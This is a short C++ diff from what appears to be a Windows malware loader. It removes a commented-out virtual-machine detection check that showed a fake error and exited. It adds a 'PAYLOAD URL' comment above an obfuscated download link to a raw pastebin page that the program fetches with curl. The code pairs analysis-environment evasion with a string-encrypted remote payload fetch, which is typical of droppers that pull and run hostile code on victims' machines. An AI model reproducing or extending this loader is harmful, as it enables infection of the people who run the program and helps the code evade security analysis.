@@ -245,16 +245,10 @@ int main(void)
         MessageBox(0, text.c_str(), caption.c_str(), MB_ICONERROR);
         return 0;
     }
-  /*
-    if (IsVM()) {
-        std::string text = "This program does not currently support virtual environnements !";
-        std::string caption = "Program";
-        MessageBox(0, text.c_str(), caption.c_str(), MB_ICONERROR);
-        return 0;
-    }*/
+  
     curl_global_init(CURL_GLOBAL_ALL);
     
-
+    //PAYLOAD URL
     std::string downloadLink = ENC("https://pastebin.com/raw/tfMN4mu5");
     
     char* buffer;
